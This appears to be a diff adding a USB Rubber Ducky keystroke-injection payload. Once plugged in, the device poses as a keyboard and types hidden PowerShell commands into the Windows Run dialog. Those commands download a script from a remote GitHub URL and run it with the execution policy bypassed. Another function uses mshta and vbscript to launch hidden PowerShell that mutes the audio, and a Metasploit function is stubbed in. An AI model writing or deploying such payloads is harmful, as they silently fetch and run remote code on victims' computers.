@@ -1,0 +1,51 @@
+VAR $TIME = 200
+
+REM ATTACKMODE STORAGE
+
+REM MUTE AUDIO
+FUNCTION MUTE()
+    WINDOWS r
+    DELAY $TIME
+    STRING mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -nop -w hidden -c $ws=New-Object -ComObject WScript.Shell;$ws.SendKeys([char]0xAD)"",0:close")
+    DELAY $TIME
+    ENTER
+END_FUNCTION
+
+REM EXECUTE SCRIPT
+FUNCTION SCRIPT()
+    WINDOWS r
+    DELAY $TIME
+    REM STRING powershell
+    REM DELAY $TIME
+    REM CTRL-SHIFT ENTER
+    REM DELAY 1000
+    REM LEFTARROW
+    REM ENTER
+    REM DELAY 1000
+    STRING cmd /c start /min "" powershell -WindowStyle Hidden -NoProfile -c "iwr 'https://raw.githubusercontent.com/PineTel/RubberDuckyTest/refs/heads/main/script.ps1' -OutFile C:\Users\ameri\Documents\script.ps1
+    ENTER
+    DELAY 1500
+    WINDOWS r
+    DELAY $TIME
+    STRING cmd /c start /min "" powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass C:\Users\ameri\Documents\script.ps1"
+    ENTER
+END_FUNCTION
+
+FUNCTION METASPLOIT()
+    WINDOWS r
+    DELAY $TIME
+
+END_FUNCTION
+
+REM BUTTON_DEF
+    ATTACKMODE HID
+    LED_RED
+
+    REM MUTE()
+    REM DELAY 3000
+    SCRIPT()
+    
+    LED_GREEN
+    DELAY 5000
+    ATTACKMODE STORAGE
+REM END_BUTTON
